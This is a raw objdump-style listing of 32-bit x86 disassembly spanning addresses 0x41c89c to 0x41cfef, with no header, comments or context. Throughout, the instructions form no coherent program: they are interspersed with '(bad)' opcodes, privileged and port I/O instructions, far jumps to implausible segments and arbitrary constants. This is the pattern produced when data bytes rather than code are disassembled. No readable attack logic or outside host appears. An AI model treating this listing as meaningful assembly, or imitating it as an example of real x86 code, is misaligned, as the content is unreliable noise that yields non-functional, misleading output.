  41c89c:	pusha  
  41c89d:	out    dx,eax
  41c89e:	or     ah,BYTE PTR [eax-0x6d]
  41c8a1:	imul   esi,DWORD PTR [edx+0x2e0bbfaa],0xaaa0e738
  41c8ab:	shl    DWORD PTR [ebx],1
  41c8ad:	shr    DWORD PTR [eax],cl
  41c8af:	lds    ebp,FWORD PTR [eax-0x16]
  41c8b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8b3:	sub    ecx,DWORD PTR [edx]
  41c8b5:	or     eax,0xfd0ef52
  41c8ba:	int3   
  41c8bb:	loope  0x41c906
  41c8bd:	cmc    
  41c8be:	sbb    ebp,esi
  41c8c0:	outs   dx,DWORD PTR ds:[esi]
  41c8c1:	adc    edi,DWORD PTR [ebx+0x69e06c76]
  41c8c7:	push   esp
  41c8c8:	adc    ecx,DWORD PTR [ecx+0xf]
  41c8cb:	jle    0x41c8db
  41c8cd:	pop    esi
  41c8ce:	mov    ebx,0xcfb9ffb6
  41c8d3:	fs out 0xb0,eax
  41c8d6:	jmp    0x41c926
  41c8d8:	lods   al,BYTE PTR ds:[esi]
  41c8d9:	leave  
  41c8da:	imul   ebx,edi,0xffffffc9
  41c8dd:	test   BYTE PTR [edx],ah
  41c8df:	popf   
  41c8e0:	stos   BYTE PTR es:[edi],al
  41c8e1:	ret    0x4b5f
  41c8e4:	iret   
  41c8e5:	retf   
  41c8e6:	lea    eax,[eax+0x2565f5d4]
  41c8ec:	and    eax,ebx
  41c8ee:	outs   dx,BYTE PTR ds:[esi]
  41c8ef:	xor    BYTE PTR [edi+0x7cd2e017],dh
  41c8f5:	push   edi
  41c8f6:	pop    ebp
  41c8f7:	and    BYTE PTR [ecx-0x78964266],dl
  41c8fd:	pop    edx
  41c8fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8ff:	ret    
  41c900:	push   es
  41c901:	jnp    0x41c8d2
  41c903:	mov    bl,0x35
  41c905:	inc    edi
  41c906:	mov    al,0x87
  41c908:	and    bl,ch
  41c90a:	sbb    BYTE PTR [ebx+0x76659702],dh
  41c910:	xor    edx,ebx
  41c912:	(bad)  
  41c913:	xor    edx,DWORD PTR [esi+0x2253931b]
  41c919:	xchg   DWORD PTR [ebp+0x6744aba8],ebp
  41c91f:	sbb    BYTE PTR [ebx-0x20],bh
  41c922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c923:	imul   eax,esi,0x6
  41c926:	mov    gs,WORD PTR [edx]
  41c928:	shr    BYTE PTR [ecx],0xcb
  41c92b:	xchg   esi,ebx
  41c92d:	mov    bl,0xf7
  41c92f:	mov    ebx,gs
  41c931:	mov    al,0x69
  41c933:	imul   esp,DWORD PTR [ebp-0x391d4576],0xffffffc8
  41c93a:	or     eax,0xf96d0242
  41c93f:	sbb    eax,0x520b5b00
  41c944:	rcl    DWORD PTR [eax],0x95
  41c947:	aad    0xce
  41c949:	mov    ?,WORD PTR [edx]
  41c94b:	fiadd  DWORD PTR [eax+edi*8]
  41c94e:	iret   
  41c94f:	loopne 0x41c938
  41c951:	mov    cs,WORD PTR [esi-0x6e]
  41c954:	gs loop 0x41c960
  41c957:	jp     0x41c952
  41c959:	imul   edi,esi,0xe8a212c9
  41c95f:	push   ss
  41c960:	xchg   esp,eax
  41c961:	sbb    cl,BYTE PTR [ecx]
  41c963:	popf   
  41c964:	(bad)  
  41c965:	pushf  
  41c966:	inc    DWORD PTR [ebp-0x75]
  41c969:	pop    eax
  41c96a:	cmp    DWORD PTR [ebx],edx
  41c96c:	pop    es
  41c96d:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41c96f:	fsubrp st(7),st
  41c971:	fldcw  WORD PTR [edi]
  41c973:	xor    esp,DWORD PTR [ebx-0x4ccd4b0a]
  41c979:	in     eax,dx
  41c97a:	lahf   
  41c97b:	test   DWORD PTR [edx],0xe70b64d
  41c981:	fs scas al,BYTE PTR es:[edi]
  41c983:	sub    bl,BYTE PTR [edx]
  41c985:	mov    dl,0x3c
  41c987:	dec    edx
  41c988:	scas   eax,DWORD PTR es:[edi]
  41c989:	mov    ah,al
  41c98b:	dec    esp
  41c98c:	(bad)  
  41c98d:	not    DWORD PTR [eax-0x4d]
  41c990:	sub    eax,0x601cd70f
  41c995:	mov    ch,0x2f
  41c997:	scas   al,BYTE PTR es:[edi]
  41c998:	jle    0x41c94f
  41c99a:	aas    
  41c99b:	push   ds
  41c99c:	popa   
  41c99d:	jne    0x41c93d
  41c99f:	les    esi,FWORD PTR [edi]
  41c9a1:	adc    dh,BYTE PTR [ebp*8+0x68195bfc]
  41c9a8:	fmul   QWORD PTR [edx]
  41c9aa:	sbb    BYTE PTR [edi],bh
  41c9ac:	mov    dl,0xf0
  41c9ae:	mov    al,0x7a
  41c9b0:	mov    bh,dh
  41c9b2:	mov    ds:0x2881c194,al
  41c9b7:	test   BYTE PTR [esi+0xc57c0bd],dl
  41c9bd:	aad    0x46
  41c9bf:	cdq    
  41c9c0:	ja     0x41c9f4
  41c9c2:	lea    edx,[esi-0x26]
  41c9c5:	popa   
  41c9c6:	(bad)  
  41c9c7:	push   esi
  41c9c8:	dec    edi
  41c9c9:	and    eax,0xd530f939
  41c9ce:	jae    0x41c9f9
  41c9d0:	int    0xda
  41c9d2:	inc    ecx
  41c9d3:	add    BYTE PTR [ebx+0x5bc079d3],ah
  41c9d9:	xchg   edx,eax
  41c9da:	jmp    0xc5992696
  41c9df:	clc    
  41c9e0:	jle    0x41ca4b
  41c9e2:	(bad)
  41c9e6:	ret    
  41c9e7:	cmc    
  41c9e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9e9:	mov    ds:0x39f28753,eax
  41c9ee:	pop    ebp
  41c9ef:	or     bh,BYTE PTR [edi+0x43]
  41c9f2:	or     BYTE PTR [ecx+0x39464446],ah
  41c9f8:	call   0xdd73:0x7f6c7e10
  41c9ff:	out    dx,ax
  41ca01:	pop    edi
  41ca02:	add    DWORD PTR [edi-0x3361091d],ebp
  41ca08:	mov    cl,0x29
  41ca0a:	cs pop esi
  41ca0c:	jecxz  0x41ca2f
  41ca0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca0f:	fld    DWORD PTR [ebx]
  41ca11:	mov    ecx,0xd62703a1
  41ca16:	cmp    DWORD PTR [edx+0x36],ebx
  41ca19:	call   0x76a45234
  41ca1e:	jmp    0x9174573
  41ca23:	or     cl,BYTE PTR [ebp+0x56]
  41ca26:	xchg   esi,eax
  41ca27:	adc    BYTE PTR [ecx],ah
  41ca29:	lds    esi,FWORD PTR [esi+0x23]
  41ca2c:	xlat   BYTE PTR ds:[ebx]
  41ca2d:	aam    0xe3
  41ca2f:	out    dx,eax
  41ca30:	mov    BYTE PTR [edi+eax*8],ch
  41ca33:	pop    ds
  41ca34:	out    dx,al
  41ca35:	div    ch
  41ca37:	pop    eax
  41ca38:	out    0x51,al
  41ca3a:	push   esi
  41ca3b:	dec    esp
  41ca3c:	push   0x76d37191
  41ca41:	mov    edi,0xe731b975
  41ca46:	jbe    0x41ca6c
  41ca48:	stc    
  41ca49:	xchg   DWORD PTR [esi-0x16],edi
  41ca4c:	imul   ebx,DWORD PTR [edi+0x1f2d232c],0xa72875da
  41ca56:	or     BYTE PTR [ebp-0x58becb83],dh
  41ca5c:	into   
  41ca5d:	scas   al,BYTE PTR es:[edi]
  41ca5e:	and    bl,ch
  41ca60:	lods   al,BYTE PTR ds:[esi]
  41ca61:	stos   DWORD PTR es:[edi],eax
  41ca62:	push   ss
  41ca63:	pop    ss
  41ca64:	or     BYTE PTR [eax+edx*8+0x1de2ac9f],dl
  41ca6b:	call   0x24ab05f7
  41ca70:	bound  edx,QWORD PTR [edx]
  41ca72:	mov    cl,0x3a
  41ca74:	adc    al,0x5b
  41ca76:	push   ds
  41ca77:	and    edi,DWORD PTR [esi+0x69]
  41ca7a:	cmp    DWORD PTR [ebp-0x110fc193],edx
  41ca80:	fs dec edi
  41ca82:	mov    WORD PTR [esi+0x6a11fcd4],gs
  41ca88:	xor    eax,0x3d5a9106
  41ca8d:	mov    dl,0xd3
  41ca8f:	or     DWORD PTR [edi-0x81c4e89],edi
  41ca95:	pop    ecx
  41ca96:	pop    esi
  41ca97:	call   DWORD PTR [edx]
  41ca99:	inc    esi
  41ca9a:	imul   ebx,ebp,0xf
  41ca9d:	sbb    dh,BYTE PTR [ebx]
  41ca9f:	pusha  
  41caa0:	ret    0x392c
  41caa3:	cld    
  41caa4:	jo     0x41ca5d
  41caa6:	xor    al,0x90
  41caa8:	or     ebp,DWORD PTR [esi]
  41caaa:	jo     0x41cad9
  41caac:	aad    0x2e
  41caae:	dec    ebp
  41caaf:	cmp    eax,0x27aaf9ce
  41cab4:	jmp    0x41ca89
  41cab6:	pop    ss
  41cab7:	pop    ecx
  41cab8:	outs   dx,BYTE PTR ds:[esi]
  41cab9:	pushf  
  41caba:	or     al,0x63
  41cabc:	xlat   BYTE PTR ds:[ebx]
  41cabd:	mov    esp,0x2fdbd8c
  41cac2:	mov    DWORD PTR [esi],esi
  41cac4:	test   al,0x14
  41cac6:	sub    al,0xb1
  41cac8:	mov    ebx,0x3035f5d0
  41cacd:	neg    DWORD PTR [esi-0x5c8d8c5a]
  41cad3:	fisub  DWORD PTR [eax+0x19]
  41cad6:	dec    eax
  41cad7:	dec    edx
  41cad8:	sbb    eax,0xfc595a23
  41cadd:	mov    eax,ds:0x7aafd936
  41cae2:	cmp    eax,0x84e060da
  41cae7:	inc    ebp
  41cae8:	and    al,0x20
  41caea:	shr    DWORD PTR [ecx-0x4776fb67],cl
  41caf0:	mov    eax,0xea4a89f2
  41caf5:	ret    
  41caf6:	mov    eax,0xf51e23e8
  41cafb:	and    eax,0x3c2fddce
  41cb00:	std    
  41cb01:	xor    dh,dh
  41cb03:	add    ecx,ebp
  41cb05:	jle    0x41cb57
  41cb07:	mov    esp,eax
  41cb09:	leave  
  41cb0a:	jmp    0x53b6:0xd5033dd5
  41cb11:	and    al,0x4e
  41cb13:	sub    bl,BYTE PTR [edi-0x61ff3d93]
  41cb19:	dec    esi
  41cb1a:	sbb    ebx,0x323dc14e
  41cb20:	setb   BYTE PTR [eax]
  41cb23:	and    DWORD PTR [ecx-0x78],0x7
  41cb27:	addr16 xchg ebp,eax
  41cb29:	inc    ecx
  41cb2a:	mov    dh,0xda
  41cb2c:	int    0x1a
  41cb2e:	pop    edi
  41cb2f:	outs   dx,BYTE PTR ds:[esi]
  41cb30:	adc    DWORD PTR [ebp+0x58bfee7a],eax
  41cb36:	mov    edi,0xa3573ce8
  41cb3b:	jmp    0x41cb46
  41cb3d:	and    ah,bl
  41cb3f:	or     bl,ch
  41cb41:	sti    
  41cb42:	es dec ecx
  41cb44:	sub    al,0x1c
  41cb46:	sub    BYTE PTR ds:0xdeb481e0,ch
  41cb4c:	cwde   
  41cb4d:	push   edx
  41cb4e:	push   eax
  41cb4f:	pop    eax
  41cb50:	into   
  41cb51:	jl     0x41caec
  41cb53:	push   ebp
  41cb54:	adc    ecx,DWORD PTR [esi+0x7a4e693f]
  41cb5a:	stc    
  41cb5b:	add    dh,BYTE PTR [esp+eiz*8-0x34743e6e]
  41cb62:	mov    bl,0xea
  41cb64:	sbb    ch,BYTE PTR [ebp-0x2d]
  41cb67:	ret    
  41cb68:	mov    ebp,0x811f9c4b
  41cb6d:	mov    edx,0x37d0963c
  41cb72:	repz jne 0x41cb9d
  41cb75:	inc    ecx
  41cb76:	adc    dh,0x57
  41cb79:	adc    DWORD PTR [eax],ecx
  41cb7b:	xor    eax,0xeb8fd75f
  41cb80:	inc    esi
  41cb81:	mov    cl,0x8d
  41cb83:	pop    DWORD PTR [ecx+esi*8-0x5d]
  41cb87:	(bad)  
  41cb88:	xor    bh,BYTE PTR [ecx-0x645d36bd]
  41cb8e:	jne    0x41cc03
  41cb90:	inc    esp
  41cb91:	test   al,0x65
  41cb93:	mov    cl,0xf
  41cb95:	repnz mov BYTE PTR [ecx+0x56],al
  41cb99:	aaa    
  41cb9a:	sbb    al,0x37
  41cb9c:	pop    ds
  41cb9d:	xor    eax,0x647fe1cc
  41cba2:	stc    
  41cba3:	rol    edi,0x92
  41cba6:	(bad)  
  41cba7:	jb     0x41cc21
  41cba9:	mov    edx,ebp
  41cbab:	dec    eax
  41cbac:	mov    dl,0x6b
  41cbae:	rcr    DWORD PTR [ebx+0x6c],cl
  41cbb1:	add    DWORD PTR [ecx+0x310100e1],0x5c9409cb
  41cbbb:	call   DWORD PTR ds:0xb9700a6a
  41cbc1:	add    BYTE PTR [esi-0x21],dl
  41cbc4:	or     al,BYTE PTR [edi+0x61]
  41cbc7:	(bad)  
  41cbc8:	xchg   edi,eax
  41cbc9:	cmp    ebp,DWORD PTR [ebp-0x119fcd95]
  41cbcf:	daa    
  41cbd0:	xlat   BYTE PTR ds:[ebx]
  41cbd1:	push   es
  41cbd2:	hlt    
  41cbd3:	jne    0x41cbef
  41cbd5:	jns    0x41cb93
  41cbd7:	mov    eax,ds:0x775a1118
  41cbdc:	cmp    BYTE PTR [edi+0x3eda813e],cl
  41cbe2:	imul   ebp,ebp,0x1be5827b
  41cbe8:	xor    BYTE PTR ds:0x1e957544,dl
  41cbee:	cli    
  41cbef:	addr16 push esi
  41cbf1:	mov    al,0xce
  41cbf3:	scas   al,BYTE PTR es:[edi]
  41cbf4:	jg     0x41cb7e
  41cbf6:	dec    ecx
  41cbf7:	pop    ss
  41cbf8:	jb     0x41cb9f
  41cbfa:	jecxz  0x41cbf9
  41cbfc:	loope  0x41cbfa
  41cbfe:	mov    eax,ds:0x1d933ced
  41cc03:	jns    0x41cba7
  41cc05:	shl    BYTE PTR [edx-0x45],0x73
  41cc09:	cld    
  41cc0a:	adc    BYTE PTR [edi+0x73],bl
  41cc0d:	frstor [edi]
  41cc0f:	and    DWORD PTR [edi+eiz*2-0x7a],0x778862de
  41cc17:	mov    ebp,0x6bf83be
  41cc1c:	mov    esi,0xcd997673
  41cc21:	xchg   ecx,eax
  41cc22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc23:	pop    ecx
  41cc24:	pusha  
  41cc25:	ins    DWORD PTR es:[edi],dx
  41cc26:	dec    esi
  41cc27:	mov    al,ds:0x73f94544
  41cc2c:	push   0x66
  41cc2e:	sahf   
  41cc2f:	jbe    0x41cc61
  41cc31:	out    0x86,eax
  41cc33:	and    dl,BYTE PTR [esi-0x6]
  41cc36:	add    DWORD PTR [esi],eax
  41cc38:	shr    BYTE PTR [ebx],1
  41cc3a:	inc    esp
  41cc3b:	xlat   BYTE PTR ds:[ebx]
  41cc3c:	ret    0x2955
  41cc3f:	mov    edi,esi
  41cc41:	mov    ch,0x67
  41cc43:	sbb    eax,0x37d0834b
  41cc48:	and    ch,BYTE PTR es:[edx]
  41cc4b:	or     BYTE PTR [edx-0x74],0xef
  41cc4f:	push   edi
  41cc50:	retf   0xd1a5
  41cc53:	mov    ecx,0xf53a8d06
  41cc58:	jnp    0x41cca6
  41cc5a:	mov    edi,0x43dc6172
  41cc5f:	(bad)  
  41cc60:	js     0x41ccaa
  41cc62:	pop    DWORD PTR [ebx]
  41cc64:	rol    ebx,cl
  41cc66:	jne    0x41ccbc
  41cc68:	ds mov bl,0x87
  41cc6b:	shl    cl,0xe0
  41cc6e:	(bad)  [ebp+0x73]
  41cc71:	or     ch,BYTE PTR [ecx+0x45]
  41cc74:	cli    
  41cc75:	mov    ebx,DWORD PTR [eax]
  41cc77:	mov    ebx,0xbb921c03
  41cc7c:	fimul  DWORD PTR [edx-0xb102130]
  41cc82:	out    0xdd,eax
  41cc84:	pop    ebp
  41cc85:	dec    edx
  41cc86:	and    DWORD PTR [ebp-0xa1e0932],0x14c74ab
  41cc90:	fist   DWORD PTR [esi-0x5d1fd19e]
  41cc96:	push   esp
  41cc97:	sbb    eax,0x8d21691d
  41cc9c:	daa    
  41cc9d:	lea    ebp,[ebx+0x188f7aa9]
  41cca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cca4:	adc    al,0x4a
  41cca6:	and    eax,0x66898d70
  41ccab:	sti    
  41ccac:	mov    ecx,0x3dfa8f6e
  41ccb1:	push   ebx
  41ccb2:	clc    
  41ccb3:	dec    esp
  41ccb4:	dec    edi
  41ccb5:	sbb    ebp,DWORD PTR [eax+edi*2+0x7a]
  41ccb9:	jno    0x41cd23
  41ccbb:	ins    BYTE PTR es:[edi],dx
  41ccbc:	dec    ecx
  41ccbd:	xchg   edx,eax
  41ccbe:	mov    bl,0x77
  41ccc0:	inc    eax
  41ccc1:	repnz pop edx
  41ccc3:	out    0x51,al
  41ccc5:	cs out 0x41,al
  41ccc8:	sub    al,0x37
  41ccca:	fisub  DWORD PTR [edi-0x5f]
  41cccd:	pop    ss
  41ccce:	push   ss
  41cccf:	mov    bh,0x7e
  41ccd1:	sbb    ebp,DWORD PTR [ecx-0x4a3e5075]
  41ccd7:	pop    edx
  41ccd8:	push   ss
  41ccd9:	push   edi
  41ccda:	adc    DWORD PTR [ecx+edi*4],ebp
  41ccdd:	xchg   ecx,eax
  41ccde:	ins    BYTE PTR es:[edi],dx
  41ccdf:	loope  0x41cd37
  41cce1:	mov    BYTE PTR [ebx-0x6c],dl
  41cce4:	jp     0x41ccc9
  41cce6:	mov    ds:0xe5cadb43,eax
  41cceb:	hlt    
  41ccec:	jg     0x41cc97
  41ccee:	xor    ch,dl
  41ccf0:	js     0x41cc9e
  41ccf2:	mov    ds:0x86bd82b8,al
  41ccf7:	les    eax,FWORD PTR [ecx]
  41ccf9:	jbe    0x41cd5c
  41ccfb:	stc    
  41ccfc:	adc    BYTE PTR [edi+ecx*8],ah
  41ccff:	out    dx,al
  41cd00:	lods   eax,DWORD PTR ds:[esi]
  41cd01:	mov    eax,ds:0xde8b6052
  41cd06:	ret    
  41cd07:	xor    edi,DWORD PTR ds:0xbee803ec
  41cd0d:	xchg   ebx,eax
  41cd0e:	add    al,BYTE PTR [ebx]
  41cd10:	sub    cl,BYTE PTR [edx+edx*4-0x34]
  41cd14:	push   edi
  41cd15:	sbb    eax,0xbd5e19a7
  41cd1a:	sub    eax,0x9db9b406
  41cd1f:	and    BYTE PTR [esi+0x74],0xbf
  41cd23:	xchg   ecx,eax
  41cd24:	jge    0x41cd08
  41cd26:	push   edx
  41cd27:	mov    ds:0x24184b19,eax
  41cd2c:	sti    
  41cd2d:	push   esp
  41cd2e:	(bad)  
  41cd2f:	sub    edi,DWORD PTR [edi+ecx*2-0x47]
  41cd33:	outs   dx,BYTE PTR ds:[esi]
  41cd34:	outs   dx,DWORD PTR ds:[esi]
  41cd35:	cli    
  41cd36:	lds    ebx,FWORD PTR [eax+0xc]
  41cd39:	fisttp DWORD PTR [ebp-0x5b]
  41cd3c:	lods   eax,DWORD PTR ds:[esi]
  41cd3d:	dec    ebp
  41cd3e:	jno    0x41cdb3
  41cd40:	dec    ebp
  41cd41:	cli    
  41cd42:	sar    bl,0x81
  41cd45:	adc    eax,ebx
  41cd47:	mov    dl,0x5c
  41cd49:	cmp    bl,BYTE PTR [ebp+0x6ea286ec]
  41cd4f:	in     eax,0xaf
  41cd51:	loopne 0x41cd61
  41cd53:	cli    
  41cd54:	xor    DWORD PTR [edi-0x63],0xffffff97
  41cd58:	cmp    eax,0x60d6a390
  41cd5d:	jbe    0x41cdca
  41cd5f:	ds stos DWORD PTR es:[edi],eax
  41cd61:	mov    eax,0xf51b2030
  41cd66:	(bad)  
  41cd67:	or     al,0xf9
  41cd69:	fld    QWORD PTR [esp+eax*1-0x38]
  41cd6d:	mov    cl,0xbc
  41cd6f:	loopne 0x41cd63
  41cd71:	cdq    
  41cd72:	mov    ds:0x62f1a38b,al
  41cd77:	es push ebp
  41cd79:	xchg   ebp,eax
  41cd7a:	outs   dx,DWORD PTR ds:[esi]
  41cd7b:	dec    ebp
  41cd7c:	xor    BYTE PTR [ebp-0x24],ch
  41cd7f:	je     0x41cdbb
  41cd81:	cmp    DWORD PTR [edx+0x29cfda40],ebx
  41cd87:	popf   
  41cd88:	imul   eax,esi,0x99352b49
  41cd8e:	pop    ecx
  41cd8f:	push   ss
  41cd90:	and    DWORD PTR ds:0x667b089e,esi
  41cd96:	xchg   DWORD PTR [edi-0x66dc25f1],ebx
  41cd9c:	rsm    
  41cd9e:	pusha  
  41cd9f:	fwait
  41cda0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cda1:	and    bl,BYTE PTR [ecx+eax*8]
  41cda4:	dec    edi
  41cda5:	sar    DWORD PTR [edi+0x70],cl
  41cda8:	pcmpgtw mm1,mm4
  41cdab:	push   0x42dae996
  41cdb0:	jns    0x41ce20
  41cdb2:	mov    bl,0x23
  41cdb4:	dec    edi
  41cdb5:	out    dx,al
  41cdb6:	cwde   
  41cdb7:	les    ebp,FWORD PTR [eax-0x46d50e7a]
  41cdbd:	xor    al,0x40
  41cdbf:	dec    ebx
  41cdc0:	into   
  41cdc1:	int3   
  41cdc2:	push   ebp
  41cdc3:	stc    
  41cdc4:	mov    bl,0x7d
  41cdc6:	xor    al,0x6b
  41cdc8:	fxch   st(2)
  41cdca:	xor    esp,DWORD PTR [ecx]
  41cdcc:	(bad)  
  41cdcd:	aas    
  41cdce:	std    
  41cdcf:	mov    bh,0xba
  41cdd1:	xchg   ebx,eax
  41cdd2:	mov    ebp,0x121f4de4
  41cdd7:	xor    BYTE PTR [edi+0x2d],0x3d
  41cddb:	push   ebx
  41cddc:	stos   BYTE PTR es:[edi],al
  41cddd:	jmp    0xc590:0x11eac8
  41cde4:	rol    DWORD PTR [ecx+0x4],1
  41cde7:	lds    ecx,FWORD PTR [edx+0x36d52658]
  41cded:	repz int 0x26
  41cdf0:	dec    eax
  41cdf1:	outs   dx,DWORD PTR ds:[esi]
  41cdf2:	addr16 fwait
  41cdf4:	rcr    DWORD PTR [edi-0x7c],0x28
  41cdf8:	imul   esp,DWORD PTR [ebp+0x11],0xfffffff6
  41cdfc:	sbb    BYTE PTR [edi-0x67],ch
  41cdff:	add    al,0xe2
  41ce01:	push   ss
  41ce02:	scas   al,BYTE PTR es:[edi]
  41ce03:	push   cs
  41ce04:	fldenv [ebx-0x1497d5b6]
  41ce0a:	mov    ds:0x17b6b763,eax
  41ce0f:	ret    0xe550
  41ce12:	rcl    bl,cl
  41ce14:	ds jbe 0x41cdfe
  41ce17:	jp     0x41cdf3
  41ce19:	add    al,0xe3
  41ce1b:	and    DWORD PTR [ecx-0x41ec971d],eax
  41ce21:	push   esp
  41ce22:	stc    
  41ce23:	out    0x44,al
  41ce25:	sub    DWORD PTR [ebp+0x3],esi
  41ce28:	adc    ah,bl
  41ce2a:	loopne 0x41ce78
  41ce2c:	mov    ds:0x32cf128,al
  41ce31:	inc    edi
  41ce32:	(bad)  
  41ce33:	xor    BYTE PTR [ecx+0xa],ch
  41ce36:	sbb    DWORD PTR [eax-0x70],esp
  41ce39:	cmc    
  41ce3a:	aad    0xa2
  41ce3c:	inc    ebx
  41ce3d:	mov    edi,0xdfb78080
  41ce42:	xor    al,0xaa
  41ce44:	sahf   
  41ce45:	std    
  41ce46:	xchg   esi,eax
  41ce47:	inc    edx
  41ce48:	test   al,0x51
  41ce4a:	aad    0x79
  41ce4c:	neg    BYTE PTR [edi+0x7b]
  41ce4f:	mov    ds:0x27c6982b,eax
  41ce54:	xchg   edi,eax
  41ce55:	or     eax,0x454b8499
  41ce5a:	mov    DWORD PTR [esi-0x24add5c7],esp
  41ce60:	sbb    edi,DWORD PTR [ebx]
  41ce62:	jae    0x41ce1a
  41ce64:	rcr    DWORD PTR [esi+0x7e],0xd
  41ce68:	pusha  
  41ce69:	cli    
  41ce6a:	lods   al,BYTE PTR ds:[esi]
  41ce6b:	add    esp,ecx
  41ce6d:	jnp    0x41ce16
  41ce6f:	iret   
  41ce70:	jne    0x41ce33
  41ce72:	aam    0x19
  41ce74:	dec    ecx
  41ce75:	cmp    dh,BYTE PTR [edx-0x5e8c4685]
  41ce7b:	popa   
  41ce7c:	loope  0x41ce7c
  41ce7e:	(bad)  
  41ce7f:	mov    ebp,0x84e54518
  41ce84:	daa    
  41ce85:	(bad)  
  41ce87:	test   eax,0x15f90f
  41ce8c:	cmc    
  41ce8d:	inc    esi
  41ce8e:	dec    ebx
  41ce8f:	or     BYTE PTR [ebp+0x77672e93],ah
  41ce95:	cmp    BYTE PTR [edx],bl
  41ce97:	(bad)  
  41ce98:	sbb    eax,0x8692c06a
  41ce9d:	push   esp
  41ce9e:	adc    eax,0xfd08d76a
  41cea3:	pop    eax
  41cea4:	push   ecx
  41cea5:	sbb    edx,ebp
  41cea7:	sbb    edx,DWORD PTR [edi]
  41cea9:	ins    BYTE PTR es:[edi],dx
  41ceaa:	and    BYTE PTR ds:0xa9f11de5,ch
  41ceb0:	mov    ah,0x2
  41ceb2:	or     DWORD PTR [edi+esi*1-0x33035fd5],0xecec9df1
  41cebd:	in     eax,0x89
  41cebf:	mov    ds:0xc1001564,eax
  41cec4:	aam    0x16
  41cec6:	and    cl,BYTE PTR [ecx+0x3e]
  41cec9:	mov    eax,ds:0x4685ff95
  41cece:	and    al,0xd
  41ced0:	mov    cl,0x70
  41ced2:	(bad)  
  41ced3:	in     eax,dx
  41ced4:	add    DWORD PTR [edx+0x3070bd5c],ebx
  41ceda:	xchg   esp,eax
  41cedb:	cmp    ch,BYTE PTR [ecx-0x38]
  41cede:	jmp    0xf34a8445
  41cee3:	mov    eax,0x8c79a8d6
  41cee8:	push   esi
  41cee9:	rol    DWORD PTR [esi-0x6ad71308],1
  41ceef:	adc    DWORD PTR [ecx-0x29],eax
  41cef2:	sub    edi,esi
  41cef4:	push   ds
  41cef5:	sahf   
  41cef6:	jge    0x41cf54
  41cef8:	test   BYTE PTR [eax-0x8a36a1b],0xda
  41ceff:	add    BYTE PTR [edx+0x66],0xb9
  41cf03:	loope  0x41ceb0
  41cf05:	mov    ds:0x54402891,eax
  41cf0a:	test   BYTE PTR [edx+0x23ed1138],bl
  41cf10:	cld    
  41cf11:	test   al,0x89
  41cf13:	and    eax,0x3034045e
  41cf18:	jl     0x41cef6
  41cf1a:	ins    BYTE PTR es:[edi],dx
  41cf1b:	mov    al,ds:0xd7067844
  41cf20:	adc    eax,0xc2972465
  41cf25:	sbb    dl,al
  41cf27:	mov    BYTE PTR [eax-0xa4957fa],dl
  41cf2d:	mov    ds:0xf112650a,al
  41cf32:	stc    
  41cf33:	pop    ebp
  41cf34:	stos   BYTE PTR es:[edi],al
  41cf35:	jno    0x41cf64
  41cf37:	fiadd  DWORD PTR [edi+0xa]
  41cf3a:	in     eax,0x60
  41cf3c:	out    dx,eax
  41cf3d:	shl    DWORD PTR [eax],cl
  41cf3f:	test   DWORD PTR ds:0x17a1589a,ecx
  41cf45:	mov    ah,0xa0
  41cf47:	jle    0x41ceda
  41cf49:	das    
  41cf4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf4b:	or     eax,0xcf81a006
  41cf50:	push   ss
  41cf51:	add    BYTE PTR [ecx-0x1e840d30],bh
  41cf57:	lahf   
  41cf58:	ja     0x41cf14
  41cf5a:	shl    DWORD PTR [ecx-0x49],0xb7
  41cf5e:	push   ecx
  41cf5f:	(bad)  
  41cf60:	hlt    
  41cf61:	sbb    edx,DWORD PTR [eax-0x69]
  41cf64:	lahf   
  41cf65:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41cf67:	jp     0x41cf15
  41cf69:	jbe    0x41cfab
  41cf6b:	stos   BYTE PTR es:[edi],al
  41cf6c:	ins    DWORD PTR es:[edi],dx
  41cf6d:	push   eax
  41cf6e:	dec    ebp
  41cf6f:	fwait
  41cf70:	or     ch,cl
  41cf72:	jge    0x41cf77
  41cf74:	(bad)  
  41cf76:	mov    eax,0xc1bf75d9
  41cf7b:	xchg   esp,eax
  41cf7c:	aam    0xd3
  41cf7e:	lds    ecx,FWORD PTR [edx-0x21]
  41cf81:	sti    
  41cf82:	sub    DWORD PTR [edx],esi
  41cf84:	fxch   st(0)
  41cf86:	xchg   al,dh
  41cf88:	xchg   ebp,eax
  41cf89:	xor    al,0xac
  41cf8b:	inc    eax
  41cf8c:	sbb    ebp,DWORD PTR [edx-0x7912c34f]
  41cf92:	mov    esp,0xe5d53f61
  41cf97:	repnz ror ebx,cl
  41cf9a:	mov    dl,0x48
  41cf9c:	mov    ebp,0xa27d879c
  41cfa1:	loope  0x41cf44
  41cfa3:	sub    DWORD PTR [eax-0x4a],edx
  41cfa6:	mov    ?,WORD PTR [ebx]
  41cfa8:	sbb    ah,BYTE PTR [edi]
  41cfaa:	cmp    dl,BYTE PTR ds:0xe06eee5f
  41cfb0:	aad    0xdd
  41cfb2:	cdq    
  41cfb3:	xchg   ebp,eax
  41cfb4:	lahf   
  41cfb5:	inc    eax
  41cfb6:	or     ecx,DWORD PTR [edx-0x61]
  41cfb9:	mov    bh,0x47
  41cfbb:	jno    0x41cf3f
  41cfbd:	inc    edx
  41cfbe:	mov    al,0x55
  41cfc0:	jmp    0x5b5:0x27e4928c
  41cfc7:	inc    eax
  41cfc8:	pusha  
  41cfc9:	retf   
  41cfca:	loop   0x41d028
  41cfcc:	frstor [ecx-0x73a7f597]
  41cfd2:	pop    edx
  41cfd3:	or     eax,0x9ea310d6
  41cfd8:	mov    ebx,0x5f081717
  41cfdd:	mov    ds:0x2476aa5c,eax
  41cfe2:	xlat   BYTE PTR ds:[ebx]
  41cfe3:	or     bl,BYTE PTR [ecx]
  41cfe5:	fwait
  41cfe6:	and    BYTE PTR [edi-0x68bd299d],cl
  41cfec:	js     0x41cf8d
  41cfee:	out    dx,al
  41cfef:	dec    ebp
